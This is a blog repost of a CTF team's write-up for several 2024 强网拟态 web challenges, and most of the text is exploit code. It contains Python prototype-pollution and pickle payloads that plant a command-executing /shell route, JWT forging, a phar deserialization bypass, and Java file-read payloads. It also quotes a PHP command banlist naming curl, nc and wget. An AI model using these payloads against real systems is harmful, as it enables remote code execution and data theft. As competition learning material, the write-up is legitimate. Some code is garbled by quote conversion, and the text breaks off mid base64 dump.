@@ -1,0 +1,1397 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024 强网拟态 Nepnep WP | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="原型链污染 + pickle 内存马 + phar:&#x2F;&#x2F; 反序列化 + JVM-SANDBOX uninstall。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 强网拟态 Nepnep WP">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/2024_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_Nepnep_WP/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="原型链污染 + pickle 内存马 + phar:&#x2F;&#x2F; 反序列化 + JVM-SANDBOX uninstall。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Python原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/2024_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_Nepnep_WP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024 强网拟态 Nepnep WP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024 强网拟态 Nepnep WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024 强网拟态 Nepnep WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/211007.html">https://www.ctfiot.com/211007.html</a><br>ID: 211007</p>
+</blockquote>
+<p>2024 强网拟态 – Nepnep -WP</p>
+<p>队伍名称：Nepnep</p>
+<p>最终排名：1st🏆</p>
+<p>感谢队里师傅们的辛苦付出！如果有意加入我们团队的师傅，欢迎发送个人简介至：<a href="mailto:&#78;&#101;&#x70;&#110;&#101;&#112;&#x5f;&#x54;&#101;&#x61;&#109;&#64;&#49;&#54;&#x33;&#46;&#x63;&#111;&#109;">&#78;&#101;&#x70;&#110;&#101;&#112;&#x5f;&#x54;&#101;&#x61;&#109;&#64;&#49;&#54;&#x33;&#46;&#x63;&#111;&#109;</a></p>
+<p>由于本文篇幅过长，如有需要 WP PDF 版本的师傅，请向后台发送“2024 强网拟态 WP”即可获取 WP。</p>
+<p>Web:</p>
+<p>ez_picker</p>
+<p>&#x2F;register 原型链污染</p>
+<p>JSON</p>
+<p>{</p>
+<p>“username”: 1,</p>
+<p>“password”: 1,</p>
+<p>“__init__”: {</p>
+<p>“__globals__”: {</p>
+<p>“safe_modules”: [</p>
+<p>“os”,</p>
+<p>“builtins”</p>
+<p>],</p>
+<p>“safe_names”:[</p>
+<p>“eval”,</p>
+<p>“popen”</p>
+<p>],</p>
+<p>“secret_key”: 111</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>JSON</p>
+<p>import pickle</p>
+<p>class A():</p>
+<p>def <strong>reduce</strong>(self):</p>
+<p>return (eval,(‘app.add_route(lambda request: <strong>import</strong>(“os”).popen(request.args.get(“cmd”)).read(),”&#x2F;shell”, methods&#x3D;[“GET”,”POST”])’,))</p>
+<p>a &#x3D; A()</p>
+<p>b &#x3D; pickle.dumps(a)</p>
+<p>print(b)</p>
+<h1 id="将字节流写入到文件-1-pkl-中"><a href="#将字节流写入到文件-1-pkl-中" class="headerlink" title="将字节流写入到文件 1.pkl 中"></a>将字节流写入到文件 1.pkl 中</h1><p>with open(‘1.pkl’, ‘wb’) as file:</p>
+<p>file.write(b)</p>
+<p>JSON</p>
+<p>import time</p>
+<p>import jwt</p>
+<p>from key import secret_key</p>
+<p>data &#x3D; {“user”: 1, “role”: “admin”}</p>
+<p>data[‘exp’] &#x3D; int(time.time()) + 60 * 5</p>
+<p>token &#x3D; jwt.encode(data, str(secret_key), algorithm&#x3D;’HS256′)</p>
+<p>print(token)</p>
+<p>上传pkl文件写内存马</p>
+<p>JSON</p>
+<p>import requests</p>
+<h1 id="目标-URL"><a href="#目标-URL" class="headerlink" title="目标 URL"></a>目标 URL</h1><p>url &#x3D; ‘<a target="_blank" rel="noopener" href="http://web-10c5ac0445.challenge.xctf.org.cn/upload%E2%80%99">http://web-10c5ac0445.challenge.xctf.org.cn/upload’</a></p>
+<h1 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h1><p>file_path &#x3D; ‘1.pkl’</p>
+<h1 id="读取文件内容并发送请求"><a href="#读取文件内容并发送请求" class="headerlink" title="读取文件内容并发送请求"></a>读取文件内容并发送请求</h1><p>with open(file_path, ‘rb’) as file:</p>
+<p>files &#x3D; {‘file’: (‘1.pkl’, file, ‘application&#x2F;octet-stream’)}</p>
+<h1 id="设置请求头"><a href="#设置请求头" class="headerlink" title="设置请求头"></a>设置请求头</h1><p>headers &#x3D; {</p>
+<p>‘User-Agent’: ‘Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;129.0.0.0 Safari&#x2F;537.36 Edg&#x2F;129.0.0.0’,</p>
+<p>‘Accept’: ‘*&#x2F;*’,</p>
+<p>‘Origin’: ‘<a target="_blank" rel="noopener" href="http://web-6f5b38ec4e.challenge.xctf.org.cn’/">http://web-6f5b38ec4e.challenge.xctf.org.cn’</a>,</p>
+<p>‘Referer’: ‘<a target="_blank" rel="noopener" href="http://web-6f5b38ec4e.challenge.xctf.org.cn/upload%E2%80%99">http://web-6f5b38ec4e.challenge.xctf.org.cn/upload’</a>,</p>
+<p>‘Accept-Encoding’: ‘gzip, deflate, br’,</p>
+<p>‘Accept-Language’: ‘zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6’,</p>
+<p>‘Cookie’: ‘token&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MjkzMjE0ODN9.qe64g5NTlukRKtTs3aRzzl7P1zIkCUz6F7m-L58MphQ’,</p>
+<p>‘Connection’: ‘close’</p>
+<p>}</p>
+<h1 id="发送-POST-请求"><a href="#发送-POST-请求" class="headerlink" title="发送 POST 请求"></a>发送 POST 请求</h1><p>response &#x3D; requests.post(url, headers&#x3D;headers, files&#x3D;files)</p>
+<h1 id="打印响应内容"><a href="#打印响应内容" class="headerlink" title="打印响应内容"></a>打印响应内容</h1><p>print(response.status_code)</p>
+<p>print(response.text)</p>
+<p>&#x2F;shell?cmd&#x3D;cat &#x2F;tr3e_fl4g_1s_h3re_lol</p>
+<p>capoo</p>
+<p>任意文件读取读源码 showpic.php</p>
+<p>源码</p>
+<p>JSON</p>
+<p>class CapooObj {</p>
+<p>public function __wakeup()</p>
+<p>{</p>
+<p>$action &#x3D; $this-&gt;action;</p>
+<p>$action &#x3D; str_replace(“””, “”, $action);</p>
+<p>$action &#x3D; str_replace(“‘”, “”, $action);</p>
+<p>$banlist &#x3D; “&#x2F;(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|~|&#96;|r|n|t|   |^|ls|.|tail|watch|wget|||;|:|(|)|{|}|*|?|[|]|@||&#x3D;|&lt;)&#x2F;i”;</p>
+<p>if(preg_match($banlist, $action)){</p>
+<p>die(“Not Allowed!”);</p>
+<p>}</p>
+<p>system($this-&gt;action);</p>
+<p>}</p>
+<p>}</p>
+<p>header(“Content-type:<br>text&#x2F;html;charset&#x3D;utf-8”);</p>
+<p>if ($_SERVER[‘REQUEST_METHOD’] &#x3D;&#x3D;&#x3D; ‘POST’ &amp;&amp; isset($_POST[‘capoo’])) {</p>
+<p>$file &#x3D; $_POST[‘capoo’];</p>
+<p>if (file_exists($file)) {</p>
+<p>$data &#x3D; 9file_get_contents($file);</p>
+<p>$base64 &#x3D; base64_encode($data);</p>
+<p>} else if (substr($file, 0, strlen(“http:&#x2F;&#x2F;”)) &#x3D;&#x3D;&#x3D; “http:&#x2F;&#x2F;”) {</p>
+<p>$data &#x3D; file_get_contents($_POST[‘capoo’] . “&#x2F;capoo.gif”);</p>
+<p>if (strpos($data, “PILER”) !&#x3D;&#x3D; false) {</p>
+<p>die(“Capoo piler not allowed!”);</p>
+<p>}</p>
+<p>file_put_contents(“capoo_img&#x2F;capoo.gif”, $data);</p>
+<p>die(“Download Capoo OK”);</p>
+<p>} else {</p>
+<p>die(‘Capoo does not exist.’);</p>
+<p>}</p>
+<p>} else {</p>
+<p>die(‘No capoo provided.’);</p>
+<p>}</p>
+<p>?&gt;</p>
+<p>src&#x3D;’data:<br>image&#x2F;gif;base64, ‘ &#x2F;&gt;</p>
+<p>远程写个phar文件，题目检测PILER字符串内容，用gzip压缩绕过</p>
+<p>Phar文件</p>
+<p>JSON</p>
+<p>highlight_file(<strong>FILE</strong>);</p>
+<p>class CapooObj</p>
+<p>{</p>
+<p>var $action&#x3D;”;</p>
+<p>}</p>
+<p>@unlink(‘test.phar’);</p>
+<p>$phar&#x3D;new Phar(‘test.phar’);  &#x2F;&#x2F;创建一个phar对象，文件名必须以phar为后缀</p>
+<p>$phar-&gt;startBuffering();</p>
+<p>$phar-&gt;setStub(“GIF89a“.””);</p>
+<p>$o&#x3D;new CapooObj();</p>
+<p>$o-&gt;action&#x3D;’whoami’;</p>
+<p>$phar-&gt;setMetadata($o);&#x2F;&#x2F;写入meta-data</p>
+<p>$phar-&gt;addFromString(“test.txt”,”m1xi@n”);  &#x2F;&#x2F;添加要压缩的文件</p>
+<p>$phar-&gt;stopBuffering();</p>
+<p>gzip压缩后改为gif，capoo&#x3D;<a target="_blank" rel="noopener" href="http://ip/">http://ip</a>:<br>port&#x2F;#下载后phar:&#x2F;&#x2F;访问</p>
+<p>虽然报错但可以执行，然后diff读文件拿flag</p>
+<p>读 flag-33ac806f</p>
+<p>OnlineRunner</p>
+<p>题目想要在不 import 任何类的情况下完成攻击。这里应该有两个思路</p>
+<p>1、直接不 import 打，尝试如下 payload 失败</p>
+<p>JSON</p>
+<p>try {</p>
+<p>Process process &#x3D; java.lang.Runtime.getRuntime().exec(“echo 123”);</p>
+<p>java.io.BufferedReader reader &#x3D; new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));</p>
+<p>String line;</p>
+<p>while ((line &#x3D; reader.readLine()) !&#x3D; null) {</p>
+<p>System.out.println(line);</p>
+<p>}</p>
+<p>process.waitFor();</p>
+<p>} catch (Exception e) {</p>
+<p>e.printStackTrace();</p>
+<p>}</p>
+<p>主要是因为题目的 Main 类没有抛出异常。目前可以使用这个 Payload 任意文件读取</p>
+<p>JSON</p>
+<p>try {</p>
+<p>java.io.FileReader fr &#x3D; new java.io.FileReader(“&#x2F;proc&#x2F;1&#x2F;cmdline”);</p>
+<p>java.io.BufferedReader br &#x3D; new java.io.BufferedReader(fr);</p>
+<p>String line;</p>
+<p>while ((line &#x3D; br.readLine()) !&#x3D; null) {</p>
+<p>System.out.println(line);</p>
+<p>}</p>
+<p>br.close();</p>
+<p>} catch (java.io.IOException e) {</p>
+<p>e.printStackTrace();</p>
+<p>}</p>
+<p>JSON</p>
+<p>java–add-opens&#x3D;java.base&#x2F;java.lang&#x3D;ALL-UNNAMED-javaagent:&#x2F;home&#x2F;ctf&#x2F;sandbox&#x2F;lib&#x2F;sandbox-agent.jar-jar&#x2F;app&#x2F;app.jar–server.port&#x3D;80</p>
+<p>列目录</p>
+<p>JSON</p>
+<p>java.io.File folder &#x3D; new java.io.File(“&#x2F;”);</p>
+<p>java.io.File[] listOfFiles &#x3D; folder.listFiles();</p>
+<p>if (listOfFiles !&#x3D; null) {</p>
+<p>for (java.io.File file : listOfFiles) {</p>
+<p>if (file.isFile()) {</p>
+<p>System.out.println(“File: ” + file.getName());</p>
+<p>} else if (file.isDirectory()) {</p>
+<p>System.out.println(“Directory: ” + file.getName());</p>
+<p>}</p>
+<p>}</p>
+<p>} else {</p>
+<p>System.out.println(“The directory does not exist or is not a directory.”);</p>
+<p>}</p>
+<p>然而这里最终的目标还是 RCE，以当前的 payload 没有办法很好地拿到 app.jar 的内容，于是用这个 payload 来看看 jar 包中都有什么，一步步想办法去读题目的实例类</p>
+<p>JSON</p>
+<p>try {</p>
+<p>java.util.zip.ZipInputStream zis &#x3D; new java.util.zip.ZipInputStream(new java.io.FileInputStream(“&#x2F;app&#x2F;app.jar”));</p>
+<p>java.util.zip.ZipEntry entry;</p>
+<p>while ((entry &#x3D; zis.getNextEntry()) !&#x3D; null) {</p>
+<p>System.out.println(entry.getName());</p>
+<p>zis.closeEntry();</p>
+<p>}</p>
+<p>zis.close();</p>
+<p>} catch (java.io.IOException e) {</p>
+<p>e.printStackTrace();</p>
+<p>}</p>
+<p>发现这里还有个 agent，直接 Runtime 打不行，大概率就是因为有这个 rasp，下载 agent</p>
+<p>JSON</p>
+<p>try {</p>
+<p>java.io.File file &#x3D; new java.io.File(“&#x2F;home&#x2F;ctf&#x2F;sandbox&#x2F;lib&#x2F;sandbox-agent.jar”); &#x2F;&#x2F; 需要读取的二进制文件</p>
+<p>java.io.BufferedInputStream bis &#x3D; new java.io.BufferedInputStream(new java.io.FileInputStream(file));</p>
+<p>byte[] buffer &#x3D; new byte[1024]; &#x2F;&#x2F; 创建一个字节数组作为缓冲区</p>
+<p>int bytesRead;</p>
+<p>while ((bytesRead &#x3D; bis.read(buffer)) !&#x3D; -1) { &#x2F;&#x2F; 循环读取</p>
+<p>&#x2F;&#x2F; 处理读取的数据（这里可以进行打印、处理等）</p>
+<p>&#x2F;&#x2F;System.out.write(buffer, 0, bytesRead);</p>
+<p>System.out.print(‘”‘);</p>
+<p>System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));</p>
+<p>System.out.println(“”,”);</p>
+<p>}</p>
+<p>} catch (</p>
+<p>java.io.IOException e) {</p>
+<p>e.printStackTrace();</p>
+<p>}</p>
+<p>JSON</p>
+<p>import base64</p>
+<p>data &#x3D; [“UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g&#x2F;+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V&#x2F;j9sq4sKJ486M3uy0LH5AVnpHyj5KY&#x2F;Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ&#x2F;dV6I92Z&#x2F;cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp&#x2F;2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq&#x2F;1+qfaH9AV19xrVZau+xjH&#x2F;pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv&#x2F;55+geAS&#x2F;hWQ4OAvi43Zdo2&#x2F;PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc&#x2F;LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W&#x2F;pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu&#x2F;7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy&#x2F;T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE&#x2F;g&#x3D;&#x3D;”,</p>
+<p>“po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO&#x2F;DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe&#x2F;u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj&#x2F;prJeM5m&#x2F;m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI&#x2F;Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq&#x2F;DHh2qJuLqyh&#x2F;LXgPDbjOlQ8NjXyfTkWeQSw2&#x2F;s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg&#x2F;&#x2F;6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i&#x2F;66W&#x2F;mQt&#x2F;UiZPlJDP0DIQdIPkX6Y9MkX0i&#x2F;gLgk+pFSvShb3OHSvmpmP8HGQ40&#x2F;IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa&#x2F;RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlil